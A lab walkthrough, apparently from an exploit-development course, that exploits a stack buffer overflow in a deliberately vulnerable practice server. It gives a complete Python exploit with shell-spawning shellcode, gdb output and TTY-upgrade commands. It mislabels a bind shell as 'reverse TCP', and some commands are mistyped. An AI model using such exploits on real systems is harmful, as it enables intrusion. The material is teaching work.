### 3. Linux Buffer Overflow Remote Shell

##### Running the vulnerable server

```
curl https://samsclass.info/127/proj/p4-server.c > p4-server.c
curl https://samsclass.info/127/proj/p4-server > p4-server
chmod a+x p4-server
./p4-server
```

In a second window, run the following command to connect to the server on its listening port:
```
nc 127.0.0.1 4001
```

The server simply echoes back what you send to it. If you look at the code, however, there is a buffer overflow vulnerability in the copier function. The bounds of the user-controlled parameter str are never checked:

```
int copier(char *str) {
  char buffer[1024];
  strcpy(buffer, str);
}
```

We can confirm the vulnerability as follows:
```
#!/usr/bin/python
# exploit.py

print "A" * 1200
```
```
chmod +x exploit.py
touch exploit
./exploit.py > exploit
nc 127.0.0.1 4001 < exploit
```

On the server side we see the following:
```
$ ./p4-server
Segmentation fault (core dumped)
```

##### Finding the EIP offset

Let's run the server in gdb so we can see the value of EIP after the crash.
```
env - gdb
source ~/.gdbinit
file p4-server
run
```

Let's use a cyclic pattern string from pwntools to help us.
```
nc 127.0.0.1 4001 < python -c "from pwn import *; print cyclic(1200)"
```

If we look at gdb when the server crashes we can see the value of EIP
```
EIP: 0x6b61616a ('jaak')
```

Using cyclic_find, we can see how many bytes we need to write to the buffer before we can control EIP.
```
$ python -c "from pwn import *; print cyclic_find('jaak')"
1036
```

Now we have enough to update our exploit script. Since the offset was at 1036, let's use a total length of 1100 bytes for the payload.

```
#!/usr/bin/python

payload_length = 1100
pre_padding = 1036 * "A"
eip = "BBBB"
post_padding = 60 * "C"

payload = pre_padding + eip + post_padding
print(payload)
```

While we are at it, let's also set up the alias.

```
alias p4client="./exploit.py > exploit; env - PWD=$PWD nc 127.0.0.1 < exploit"
```

##### Shellcode

We are going to use shellcode that opens a reverse TCP connection. After successful exploitation, if we use netcat to connect to the listening port, we will have a shell on the server.

As in the last example, we will use a NOPsled as well as some NOPs after the shellcode so it has room to work. 

We will pad on both sides of EIP to make the payload have a consistent length of 1100 bytes.

```
#!/usr/bin/python

def nops(amt):
	return "\x90" * amt

payload_length = 1100
eip_offset = 1036

PORT = "\x05\x39" # 1337
shellcode = (
"\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3" +
"\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80" +
"\x89\xc7\xb0\x66\x5b\x31\xd2\x52\x66" +
"\x68" + PORT + "\x66\x53\x89\xe1\x6a" +
"\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0" +
"\x50\x57\x89\xe1\x43\x43\xb0\x66\xcd" +
"\x80\x31\xd2\x52\x52\x57\x43\x89\xe1" +
"\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02" +
"\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68" +
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" +
"\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"
)
pre_padding = (eip_offset - 256 - len(shellcode) - 32) * "A"
post_padding = (payload_length - eip_offset - 4) * "B"
eip = "XXXX"

payload = nops(256) + shellcode + nops(32) + pre_padding + eip + post_padding
print(payload)
```

The last step is to figure out which address to jump to. If we run the payload again and check the server at the breakpoint at the end of the copier function, we can see the nopsled on the stack:

```
gdb-peda$ x/64xw $esp
0xbfffd5c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd5d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd5e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd5f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd600:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd610:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd620:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd630:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd640:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd650:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd660:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd670:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd680:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd690:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd6a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffd6b0:     0x90909090      0x90909090      0x90909090      0x90909090
```

Let's pick an address right in the middle. 0xbfffd630 looks good.

After we update eip in our script and run the exploit again, the server doesn't crash!

If we check netstat, we can see something listening on port 1337.
Let's try to connect to it.
```
$ netstat -a | grep 1337
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN
$ nc 127.0.0.1 1337
whoami
jc
python -c 'import pty; pty.spawn("/bin/bash")'
jc@u32-vm:/home/jc/exploitdev/p4buf$
```

We've got a shell! Let's upgrade it.

First, let's find out what our TERM and stty options are:
```
jc@u32-vm:~$ echo $TERM
screen
jc@u32-vm:~$ stty -a | head -n 1
speed 38400 baud; rows 52; columns 106; line = 0;
```

So we have a term type **screen** with **52** rows and **106** columns.

Next, after connecting to the reverse shell, issue the following commands:
```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

stty raw -echo
fg

reset
export SHELL=bash
export TERM=screen
stty rows 52 columns 106
```
